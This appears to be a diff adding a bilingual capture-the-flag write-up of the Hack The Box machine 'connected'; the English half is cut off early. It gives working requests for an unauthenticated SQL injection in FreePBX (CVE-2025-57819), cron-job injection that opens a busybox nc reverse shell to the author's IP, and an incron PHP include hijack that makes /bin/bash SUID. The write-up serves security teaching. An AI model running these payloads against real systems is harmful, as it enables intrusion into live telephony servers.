@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>connected | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+    <style>
+        .code-block {
+            position: relative;
+            background: #1e1e2e;
+            border-radius: 8px;
+            margin: 1.2em 0;
+            overflow: hidden;
+        }
+
+        [data-theme="light"] .code-block {
+            background: #f5f5f5;
+            border: 1px solid #e0e0e0;
+        }
+
+        .code-label {
+            display: inline-block;
+            background: #89b4fa;
+            color: #1e1e2e;
+            padding: 2px 10px;
+            border-radius: 0 0 6px 0;
+            font-size: 0.8em;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .code-block pre {
+            margin: 0;
+            padding: 1em 1.2em;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            word-break: break-all;
+        }
+
+        .code-block code {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.92em;
+            line-height: 1.6;
+            color: #cdd6f4;
+        }
+
+        [data-theme="light"] .code-block code {
+            color: #1e1e2e;
+        }
+
+        /* Syntax highlighting colors */
+        .code-block .kw { color: #c678dd; font-weight: bold; }
+        .code-block .cmd { color: #89b4fa; }
+        .code-block .str { color: #a6e3a1; }
+        .code-block .flag { color: #fab387; }
+        .code-block .comment { color: #6c7086; font-style: italic; }
+        .code-block .url { color: #f9e2af; }
+        .code-block .ip { color: #f38ba8; }
+        .code-block .var { color: #cba6f7; }
+        .code-block .num { color: #fab387; }
+        .code-block .user { color: #a6e3a1; }
+        .code-block .path { color: #f9e2af; }
+        .code-block .http-header { color: #89b4fa; }
+        .code-block .http-value { color: #a6e3a1; }
+        .code-block .error { color: #f38ba8; }
+        .code-block .success { color: #a6e3a1; }
+        .code-block .php-tag { color: #f38ba8; }
+        .code-block .php-func { color: #89b4fa; }
+        .code-block .php-str { color: #a6e3a1; }
+        .code-block .php-class { color: #f9e2af; }
+        .code-block .php-kw { color: #c678dd; font-weight: bold; }
+        .code-block .php-var { color: #cba6f7; }
+
+        [data-theme="light"] .code-block .kw { color: #7c3aed; }
+        [data-theme="light"] .code-block .cmd { color: #2563eb; }
+        [data-theme="light"] .code-block .str { color: #16a34a; }
+        [data-theme="light"] .code-block .flag { color: #d97706; }
+        [data-theme="light"] .code-block .comment { color: #9ca3af; }
+        [data-theme="light"] .code-block .url { color: #b45309; }
+        [data-theme="light"] .code-block .ip { color: #dc2626; }
+        [data-theme="light"] .code-block .var { color: #7c3aed; }
+        [data-theme="light"] .code-block .num { color: #d97706; }
+        [data-theme="light"] .code-block .user { color: #16a34a; }
+        [data-theme="light"] .code-block .path { color: #b45309; }
+        [data-theme="light"] .code-block .http-header { color: #2563eb; }
+        [data-theme="light"] .code-block .http-value { color: #16a34a; }
+        [data-theme="light"] .code-block .error { color: #dc2626; }
+        [data-theme="light"] .code-block .success { color: #16a34a; }
+        [data-theme="light"] .code-block .php-tag { color: #dc2626; }
+        [data-theme="light"] .code-block .php-func { color: #2563eb; }
+        [data-theme="light"] .code-block .php-str { color: #16a34a; }
+        [data-theme="light"] .code-block .php-class { color: #b45309; }
+        [data-theme="light"] .code-block .php-kw { color: #7c3aed; }
+        [data-theme="light"] .code-block .php-var { color: #7c3aed; }
+    </style>
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">connected</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <!-- SPANISH CONTENT -->
+            <div id="content-es" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba un servicio <code>FreePBX</code> versión 16.0.40.7 detrás de un Apache sobre CentOS, accesible en los puertos 80 y 443. El servicio resultó ser vulnerable a <code>CVE-2025-57819</code>, una inyección SQL en el endpoint <code>/admin/ajax.php</code> del módulo de endpoint, la cual permite ejecutar queries SQL arbitrarias sin autenticación.</p>
+
+                    <p>Aprovechando esta SQLi, fue posible insertar un registro malicioso en la tabla <code>cron_jobs</code> de FreePBX. Este cronjob ejecutaba periódicamente un comando de reverse shell mediante <code>busybox nc</code>, lo que proporcionó acceso inicial como el usuario <code>asterisk</code>. La espera fue algo superior al minuto esperado del intervalo del cron, pero acabó funcionando sin problemas.</p>
+
+                    <p>Para la escalada de privilegios, se identificó el servicio <code>incrond</code> ejecutándose como root, el cual monitoriza cambios en ficheros específicos del sistema. Uno de los triggers observaba el fichero <code>/usr/local/asterisk/ha_trigger</code> — que tenía permisos de escritura para cualquier usuario — y al detectar escritura ejecutaba el script <code>/usr/sbin/sysadmin_ha</code>. Este script PHP incluía un fichero (<code>incron.php</code>) que no existía en una ruta bajo el control del usuario <code>asterisk</code>. Creando dicha estructura de directorios y el fichero con una clase PHP maliciosa que ejecutaba <code>chmod +s /bin/bash</code>, bastó con escribir en <code>ha_trigger</code> para que <code>incrond</code> disparase el script como root, otorgando SUID a <code>/bin/bash</code> y permitiendo obtener una shell de root con <code>bash -p</code>.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> FreePBX 16.0.40.7 SQLi no autenticada (CVE-2025-57819), inyección de cronjob vía SQL para RCE, escalada de privilegios mediante abuso de <code>incron</code> file watch con PHP include hijacking.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de <code>nmap</code> para identificar los puertos abiertos y los servicios que se ejecutan en la máquina objetivo:</p>
+
+                <div class="code-block">
+                    <span class="code-label">plaintext</span>
+                    <pre><code><span class="kw">PORT     STATE SERVICE  VERSION</span>
+<span class="num">22</span>/tcp   open  ssh      <span class="str">OpenSSH 7.4 (protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="num">2048</span> 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
+|   <span class="num">256</span> 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
+|_  <span class="num">256</span> 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
+<span class="num">80</span>/tcp   open  http     <span class="str">Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)</span>
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
+|_http-title: Did not follow redirect to <span class="url">http://connected.htb/</span>
+<span class="num">443</span>/tcp  open  ssl/http <span class="str">Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)</span>
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=<span class="str">pbxconnect</span>/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+|   Not valid before: 2025-11-30T14:07:27
+|_  Not valid after:  2026-11-30T14:07:27
+|_http-title: <span class="error">400 Bad Request</span></code></pre>
+                </div>
+
+                <p>El escaneo revela tres puertos abiertos: <code>SSH</code> en el 22, <code>HTTP</code> en el 80 y <code>HTTPS</code> en el 443. El puerto 80 redirige a <code>http://connected.htb/</code>, así que añado el hostname al fichero <code>/etc/hosts</code> para poder resolver correctamente.</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="cmd">echo</span> <span class="str">"10.129.17.43 connected.htb"</span> | <span class="cmd">sudo</span> <span class="cmd">tee</span> <span class="flag">-a</span> <span class="path">/etc/hosts</span></code></pre>
+                </div>
+
+                <h2>Enumeración Web - FreePBX</h2>
+                <p>Al inspeccionar los puertos 80 y 443, descubro que la máquina ejecuta un servicio <strong>FreePBX versión 16.0.40.7</strong> (<a href="https://github.com/freepbx">https://github.com/freepbx</a>). FreePBX es una interfaz web de código abierto para gestionar sistemas de telefonía Asterisk, bastante popular en entornos empresariales.</p>
+
+                <h2>Investigación de Vulnerabilidades - CVE-2025-57819</h2>
+                <p>Investigando esta versión específica de FreePBX, descubro que está afectada por <a href="https://nvd.nist.gov/vuln/detail/cve-2025-57819">CVE-2025-57819</a>, una vulnerabilidad de inyección SQL que permite ejecutar queries SQL arbitrarias sin autenticación. En las condiciones adecuadas, esta SQLi puede traducirse en ejecución remota de código (RCE).</p>
+
+                <p>Encuentro una PoC en GitHub (<a href="https://github.com/MuhammadWaseem29/SQL-Injection-and-RCE_CVE-2025-57819">https://github.com/MuhammadWaseem29/SQL-Injection-and-RCE_CVE-2025-57819</a>) y un artículo detallado en el SANS ISC (<a href="https://isc.sans.edu/diary/32350">https://isc.sans.edu/diary/32350</a>), que explican tanto la vulnerabilidad como la cadena de explotación completa.</p>
+
+                <h3>Confirmando la Inyección SQL</h3>
+                <p>El endpoint vulnerable se encuentra en <code>/admin/ajax.php</code>, específicamente en el módulo de endpoint. El parámetro <code>brand</code> es inyectable. Para confirmar la vulnerabilidad, utilizo la técnica <code>EXTRACTVALUE</code> para extraer datos mediante error-based SQLi:</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="cmd">curl</span> <span class="flag">-i</span> <span class="flag">-k</span> <span class="str">"https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"</span></code></pre>
+                </div>
+
+                <p>La respuesta del servidor confirma la inyección:</p>
+
+                <div class="code-block">
+                    <span class="code-label">plaintext</span>
+                    <pre><code><span class="http-header">HTTP/1.1</span> <span class="error">500 Internal Server Error</span>
+<span class="http-header">Server:</span> <span class="http-value">Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16</span>
+<span class="http-header">X-Powered-By:</span> <span class="http-value">PHP/7.4.16</span>
+<span class="http-header">Content-Type:</span> <span class="http-value">application/json</span>
+
+{<span class="str">"error"</span>:{<span class="str">"type"</span>:<span class="str">"Exception"</span>,<span class="str">"message"</span>:<span class="str">"SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '<span class="success">~USER:freepbxuser@localhost~</span>'"</span>,<span class="str">"file"</span>:<span class="str">"\/var\/www\/html\/admin\/libraries\/utility.functions.php"</span>,<span class="str">"line"</span>:<span class="num">123</span>}}</code></pre>
+                </div>
+
+                <p>Se puede ver claramente en la respuesta de error el usuario de MySQL: <code>freepbxuser@localhost</code>, confirmando que la inyección SQL funciona correctamente.</p>
+
+                <h2>Acceso Inicial - De SQLi a RCE vía Cronjobs</h2>
+                <p>El artículo del SANS ISC detalla una técnica para convertir esta SQLi en RCE. FreePBX gestiona cronjobs a través de la base de datos, mediante la tabla <code>cron_jobs</code>. Insertando un registro malicioso en esta tabla, podemos hacer que FreePBX ejecute comandos arbitrarios cuando el cron se dispare.</p>
+
+                <h3>PoC del Artículo</h3>
+                <p>La PoC original inserta un cronjob que crea un archivo PHP con un webshell básico:</p>
+
+                <div class="code-block">
+                    <span class="code-label">http</span>
+                    <pre><code><span class="kw">GET</span> <span class="path">/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=x'</span> <span class="str">;INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','takdak','echo "PD9waHAg..."|base64 -d >/var/www/html/rspgf.php',NULL,'* * * * *',30,1,1) --</span></code></pre>
+                </div>
+
+                <p>El payload en base64 decodificado es:</p>
+
+                <div class="code-block">
+                    <span class="code-label">php</span>
+                    <pre><code><span class="php-tag">&lt;?php</span> <span class="php-func">header</span>(<span class="php-str">'x_poc: CVE-2025-57819'</span>); <span class="php-kw">echo</span> <span class="php-func">shell_exec</span>(<span class="php-str">'uname -a'</span>); <span class="php-func">unlink</span>(<span class="php-var">__FILE__</span>); <span class="php-tag">?&gt;</span></code></pre>
+                </div>
+
+                <p>Esto crea un fichero PHP a modo de webshell que ejecuta <code>uname -a</code> como demostración. Sin embargo, para nuestros propósitos podemos usar una aproximación más directa.</p>
+
+                <h3>Verificación de RCE</h3>
+                <p>Antes de enviar una reverse shell, verifico que el mecanismo de cronjobs funciona insertando un job sencillo que realice un <code>wget</code> a mi máquina:</p>
+
+                <div class="code-block">
+                    <span class="code-label">http</span>
+                    <pre><code><span class="kw">POST</span> <span class="path">/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+;INSERT+INTO+cron_jobs+(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)+VALUES+('sysadmin','test','wget+10.10.15.180',NULL,'*+*+*+*+*',30,1,1)--+</span> <span class="str">HTTP/1.1</span></code></pre>
+                </div>
+
+                <p>La respuesta es un error esperado, ya que la query inyectada no devuelve datos válidos para la vista PHP:</p>
+
+                <div class="code-block">
+                    <span class="code-label">json</span>
+                    <pre><code>{<span class="str">"error"</span>:{<span class="str">"type"</span>:<span class="str">"Whoops\\Exception\\ErrorException"</span>,<span class="str">"message"</span>:<span class="str">"Trying to access array offset on value of type bool"</span>,<span class="str">"file"</span>:<span class="str">"\/var\/www\/html\/admin\/modules\/endpoint\/views\/model.php"</span>,<span class="str">"line"</span>:<span class="num">144</span>}}</code></pre>
+                </div>
+
+                <p>Este error es perfectamente normal — lo importante es que la sentencia <code>INSERT</code> se ha ejecutado en la base de datos. Me pongo en escucha en el puerto 80 y al rato recibo la confirmación:</p>
+
+                <div class="code-block">
+                    <span class="code-label">plaintext</span>
+                    <pre><code><span class="ip">10.129.17.43</span> - - <span class="str">"GET / HTTP/1.1"</span> <span class="success">200</span> -</code></pre>
+                </div>
+
+                <p>Tarda algo más del minuto que cabría esperar por el intervalo del cronjob (<code>* * * * *</code>), pero acaba funcionando. Con esto confirmo que tengo ejecución remota de código.</p>
+
+                <h3>Obteniendo una Reverse Shell</h3>
+                <p>En lugar de crear una webshell, opto por enviarme directamente una reverse shell con <code>busybox nc</code>:</p>
+
+                <div class="code-block">
+                    <span class="code-label">http</span>
+                    <pre><code><span class="kw">POST</span> <span class="path">/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+;INSERT+INTO+cron_jobs+(modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)+VALUES+('sysadmin','test2','busybox+nc+10.10.15.180+443+-e+sh',NULL,'*+*+*+*+*',30,1,1)--+</span> <span class="str">HTTP/1.1</span></code></pre>
+                </div>
+
+                <p>Me pongo en escucha con <code>netcat</code> y al cabo de un momento recibo la conexión:</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="cmd">sudo</span> <span class="cmd">nc</span> <span class="flag">-lvnp</span> <span class="num">443</span>
+listening on [any] <span class="num">443</span> ...
+connect to [<span class="ip">10.10.15.180</span>] from (UNKNOWN) [<span class="ip">10.129.17.43</span>] <span class="num">47916</span>
+bash: no job control in this shell
+
+  ______              ______ ______  __   __
+ |  _____|           |  ___ \|  ___ \\ \ / /
+ | |_  _ __  ___  ___| |_/ /| |_/ / \ V /
+ | _| | '__|/ _ \/ _ \  __/ |  ___ \ / \
+ | |  | |  |  __/|  __/| |  | |_/ // /^\ \
+ \_|  |_|   \___| \___|\_ | \____/ \/   \/
+
+NOTICE! You have 3 notifications! Please log into the UI to see them!
+
+Current Network Configuration
++-----------+-------------------+---------------------------+
+| Interface | MAC Address       | IP Addresses              |
++-----------+-------------------+---------------------------+
+| eth0      | A2:DE:AD:BB:B6:54 | <span class="ip">10.129.17.43</span>              |
+|           |                   | fe80::82bd:1bcb:a990:dd3b |
++-----------+-------------------+---------------------------+
+
+<span class="user">[asterisk@connected ~]$</span></code></pre>
+                </div>
+
+                <p>Tengo acceso como el usuario <code>asterisk</code>. La TTY se comporta de manera algo extraña, así que para facilitarme la vida añado mi clave pública SSH a <code>.ssh/authorized_keys</code> y establezco persistencia por SSH.</p>
+
+                <h2>Enumeración Post-Explotación</h2>
+                <p>Una vez dentro, enumero los servicios que se ejecutan localmente. Con <code>ps</code> observo que root ejecuta una aplicación web en Python:</p>
+
+                <div class="code-block">
+                    <span class="code-label">plaintext</span>
+                    <pre><code><span class="user">root</span> <span class="num">1368</span> 0.0 0.8 267684 35240 ? S 11:08 0:01 <span class="cmd">/usr/bin/python3.6</span> <span class="flag">-m</span> aiohttp.web aiovega.web:app_factory <span class="flag">-H</span> <span class="ip">127.0.0.1</span> <span class="flag">-P</span> <span class="num">4000</span></code></pre>
+                </div>
+
+                <p>Además hay varios puertos abiertos internamente:</p>
+
+                <div class="code-block">
+                    <span class="code-label">plaintext</span>
+                    <pre><code>tcp  0  0  <span class="ip">127.0.0.1</span>:<span class="num">27017</span>  0.0.0.0:*  LISTEN   <span class="comment"># MongoDB</span>
+tcp  0  0  <span class="ip">127.0.0.1</span>:<span class="num">3306</span>   0.0.0.0:*  LISTEN   <span class="comment"># MySQL</span>
+tcp  0  0  <span class="ip">127.0.0.1</span>:<span class="num">6379</span>   0.0.0.0:*  LISTEN   <span class="comment"># Redis</span>
+tcp  0  0  <span class="ip">127.0.0.1</span>:<span class="num">5038</span>   0.0.0.0:*  LISTEN   <span class="comment"># Asterisk AMI</span>
+tcp  0  0  <span class="ip">127.0.0.1</span>:<span class="num">25</span>     0.0.0.0:*  LISTEN   <span class="comment"># SMTP</span>
+tcp  0  0  <span class="ip">127.0.0.1</span>:<span class="num">4000</span>   0.0.0.0:*             <span class="comment"># aiohttp app</span></code></pre>
+                </div>
+
+                <p>Investigo el servicio del puerto 4000, que parece ser algún tipo de proxy:</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="user">[asterisk@connected ~]$</span> <span class="cmd">curl</span> localhost:<span class="num">4000</span>
+{<span class="str">"status"</span>: <span class="num">400</span>, <span class="str">"message"</span>: <span class="str">"Vega to proxy to isn't specified"</span>}</code></pre>
+                </div>
+
+                <p>Investigué un poco más sobre este servicio pero acabó siendo un callejón sin salida, sin encontrar nada aprovechable.</p>
+
+                <h2>Escalada de Privilegios - Abuso de Incron</h2>
+                <p>Analizando automatismos, crons y otras tareas recurrentes, descubro el servicio <code>incrond</code> ejecutándose como root:</p>
+
+                <div class="code-block">
+                    <span class="code-label">plaintext</span>
+                    <pre><code><span class="user">root</span> <span class="num">754</span> 0.0 0.0 15044 1120 ? Ss 11:08 0:00 <span class="cmd">/usr/sbin/incrond</span></code></pre>
+                </div>
+
+                <p><code>incron</code> es un demonio similar a <code>cron</code>, pero en lugar de ejecutar tareas basándose en tiempo, las ejecuta cuando se detectan eventos del sistema de ficheros (mediante <code>inotify</code>). Es decir, monitoriza cambios en ficheros y directorios y ejecuta comandos cuando se producen.</p>
+
+                <h3>Analizando los Triggers de Incron</h3>
+                <p>Examino la configuración de <code>incron</code> para ver qué ficheros monitoriza:</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="user">[asterisk@connected ~]$</span> <span class="cmd">cat</span> <span class="path">/etc/incron.d/legacy</span>
+<span class="path">/var/spool/asterisk/sysadmin/vpnget</span>                    <span class="kw">IN_CLOSE_WRITE</span> <span class="cmd">/usr/sbin/sysadmin_openvpn -d</span>
+<span class="path">/var/spool/asterisk/sysadmin/intrusion_detection_stop</span>   <span class="kw">IN_CLOSE_WRITE</span> <span class="cmd">/etc/init.d/fail2ban stop</span>
+<span class="path">/var/spool/asterisk/sysadmin/update_system_cron</span>         <span class="kw">IN_CLOSE_WRITE</span> <span class="cmd">/usr/sbin/sysadmin_update_set_cron</span>
+<span class="path">/var/spool/asterisk/sysadmin/portmgmt_setup</span>             <span class="kw">IN_CLOSE_WRITE</span> <span class="cmd">/usr/sbin/sysadmin_portmgmt</span>
+<span class="path">/var/spool/asterisk/sysadmin/wanrouter_restart</span>          <span class="kw">IN_CLOSE_WRITE</span> <span class="cmd">/usr/sbin/sysadmin_wanrouter_restart</span>
+<span class="path">/var/spool/asterisk/sysadmin/dahdi_restart</span>              <span class="kw">IN_CLOSE_WRITE</span> <span class="cmd">/usr/sbin/sysadmin_dahdi_restart</span>
+<span class="path">/usr/local/asterisk/ha_trigger</span>                          <span class="kw">IN_CLOSE_WRITE</span> <span class="cmd">/usr/sbin/sysadmin_ha</span></code></pre>
+                </div>
+
+                <p>Cada línea define: un fichero a monitorizar, un evento (<code>IN_CLOSE_WRITE</code> = se cierra un fichero después de escribir en él), y un comando a ejecutar cuando se detecta el evento. Todos estos comandos se ejecutan como <strong>root</strong>, ya que <code>incrond</code> corre como root.</p>
+
+                <h3>Identificando el Vector de Ataque</h3>
+                <p>Compruebo los permisos del fichero <code>ha_trigger</code>:</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="user">[asterisk@connected ~]$</span> <span class="cmd">ls</span> <span class="flag">-lah</span> <span class="path">/usr/local/asterisk/ha_trigger</span>
+<span class="success">-rwxrwxrwx.</span> 1 asterisk asterisk 0 Jun 7 15:44 <span class="path">/usr/local/asterisk/ha_trigger</span></code></pre>
+                </div>
+
+                <p>El fichero tiene permisos <code>rwxrwxrwx</code> — ¡cualquier usuario puede escribir en él! Esto significa que puedo disparar el evento <code>IN_CLOSE_WRITE</code> simplemente escribiendo en este fichero, lo que hará que <code>incrond</code> ejecute <code>/usr/sbin/sysadmin_ha</code> como root.</p>
+
+                <h3>Analizando el Script sysadmin_ha</h3>
+                <p>Veamos qué hace el script que se ejecuta:</p>
+
+                <div class="code-block">
+                    <span class="code-label">php</span>
+                    <pre><code><span class="php-tag">#!/usr/bin/php -q</span>
+<span class="php-tag">&lt;?php</span>
+
+<span class="php-kw">if</span>(<span class="php-func">file_exists</span>(<span class="php-str">"/var/www/html/admin/modules/freepbx_ha/license.php"</span>)) {
+    <span class="php-func">include_once</span>(<span class="php-str">"/var/www/html/admin/modules/freepbx_ha/license.php"</span>);
+}
+
+<span class="php-var">$i</span> = <span class="php-str">"/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php"</span>;
+<span class="php-kw">if</span> (<span class="php-func">file_exists</span>(<span class="php-var">$i</span>)) {
+    <span class="php-func">require_once</span>(<span class="php-var">$i</span>);
+    <span class="php-var">$incron</span> = <span class="php-kw">new</span> <span class="php-class">incron</span>;
+    <span class="php-var">$incron</span>-><span class="php-func">rootTrigger</span>();
+}</code></pre>
+                </div>
+
+                <p>Este script PHP es muy interesante. Intenta incluir el fichero <code>/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php</code> y, si existe, instancia la clase <code>incron</code> y llama al método <code>rootTrigger()</code>. Todo esto se ejecuta como <strong>root</strong> gracias a <code>incrond</code>.</p>
+
+                <h3>Creando el Payload PHP</h3>
+                <p>La clave está en que la ruta <code>/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php</code> <strong>no existe en el sistema</strong>, pero el directorio <code>/var/www/html/admin/modules/</code> pertenece a nuestro usuario <code>asterisk</code>, por lo que podemos crear toda la estructura de directorios y el fichero PHP a nuestro antojo.</p>
+
+                <p>Creo la estructura de directorios necesaria y el fichero <code>incron.php</code> con una clase maliciosa:</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="cmd">mkdir</span> <span class="flag">-p</span> <span class="path">/var/www/html/admin/modules/freepbx_ha/functions.inc/</span></code></pre>
+                </div>
+
+                <p>Y escribo el contenido del fichero PHP:</p>
+
+                <div class="code-block">
+                    <span class="code-label">php</span>
+                    <pre><code><span class="php-tag">&lt;?php</span>
+
+<span class="php-kw">class</span> <span class="php-class">incron</span> {
+    <span class="php-kw">public function</span> <span class="php-func">rootTrigger</span>() {
+        <span class="php-func">shell_exec</span>(<span class="php-str">'chmod +s /bin/bash'</span>);
+    }
+}</code></pre>
+                </div>
+
+                <p>Esta clase define el método <code>rootTrigger()</code> que el script <code>sysadmin_ha</code> invocará. El comando <code>chmod +s /bin/bash</code> establece el bit SUID en <code>/bin/bash</code>, lo que nos permitirá ejecutar bash como root.</p>
+
+                <h3>Disparando el Trigger</h3>
+                <p>Con todo preparado, solo queda escribir en el fichero monitorizado para que <code>incrond</code> dispare la cadena:</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="cmd">touch</span> <span class="path">/usr/local/asterisk/ha_trigger</span></code></pre>
+                </div>
+
+                <p>El comando <code>touch</code> escribe en el fichero (actualiza su timestamp), lo que genera el evento <code>IN_CLOSE_WRITE</code>. Esto hace que <code>incrond</code> ejecute <code>/usr/sbin/sysadmin_ha</code> como root, el cual incluye nuestro <code>incron.php</code> malicioso y llama a <code>rootTrigger()</code>, que establece el bit SUID en <code>/bin/bash</code>.</p>
+
+                <p>Verifico que ha funcionado:</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="user">[asterisk@connected ~]$</span> <span class="cmd">ls</span> <span class="flag">-la</span> <span class="path">/bin/bash</span>
+<span class="error">-rwsr-sr-x.</span> 1 root root 964536 Apr  1  2020 <span class="path">/bin/bash</span></code></pre>
+                </div>
+
+                <p>¡El bit SUID (<code>s</code>) está activo! Ahora ejecuto <code>bash -p</code> para obtener una shell con privilegios de root, consiguiendo así la flag del sistema y completando la máquina.</p>
+
+                <div class="code-block">
+                    <span class="code-label">bash</span>
+                    <pre><code><span class="user">[asterisk@connected ~]$</span> <span class="cmd">bash</span> <span class="flag">-p</span>
+<span class="user">[root@connected ~]#</span> <span class="cmd">whoami</span>
+<span class="success">root</span></code></pre>
+                </div>
+            </div>
+
+            <!-- ENGLISH CONTENT -->
+            <div id="content-en" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a <code>FreePBX</code> service version 16.0.40.7 behind Apache on CentOS, accessible on ports 80 and 443. The service turned out to be vulnerable to <code>CVE-2025-57819</code>, a SQL injection in the <code>/admin/ajax.php</code> endpoint of the endpoint module, which allows executing arbitrary SQL queries without authentication.</p>
+
+                    <p>By leveraging this SQLi, it was possible to insert a malicious record into FreePBX's <code>cron_jobs</code> table. This cronjob periodically executed a reverse shell command via <code>busybox nc</code>, providing initial access as the <code>asterisk</code> user. The wait was slightly longer than the expected one-minute cron interval, but it worked without issues.</p>
+
+                    <p>For privilege escalation, the <code>incrond</code> service was identified running as root, monitoring filesystem changes on specific files. One of the triggers watched the file <code>/usr/local/asterisk/ha_trigger</code> — which had world-writable permissions — and upon detecting a write event, it executed the <code>/usr/sbin/sysadmin_ha</code> script. This PHP script included a file (<code>incron.php</code>) that didn't exist on a path controlled by the <code>asterisk</code> user. By creating the directory structure and the file with a malicious PHP class that executed <code>chmod +s /bin/bash</code>, all that was needed was to write to <code>ha_trigger</code> so that <code>incrond</code> would fire the script as root, granting SUID to <code>/bin/bash</code> and allowing a root shell via <code>bash -p</code>.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> FreePBX 16.0.40.7 unauthenticated SQLi (CVE-2025-57819), cronjob injection via SQL for RCE, privilege escalation via <code>incron</code> file watch abuse with PHP include hijacking.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an <code>nmap</code> scan to identify open ports and services running on the target machine:</p>
+
+                <div class="code-block">
+                    <span class="code-label">plaintext</span>
+                    <pre><code><span class="kw">PORT     STATE SERVICE  VERSION</span>
+<span class="num">22</span>/tcp   open  ssh      <span class="str">OpenSSH 7.4 (protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="num">2048</span> 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
+|   <span class="num">256</span> 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
+|_  <span class="num">256</span> 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
+<span class="num">80</span>/tcp   open  http     <span class="str">Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)</span>
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
+|_http-title: Did not follow redirect to <span class="url">http://connected.htb/</span>
+<span class="num">443</span>/tcp  open  ssl/http <span class="str">Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)</span>
+|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=<span class="str">pbxconnect</span>/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
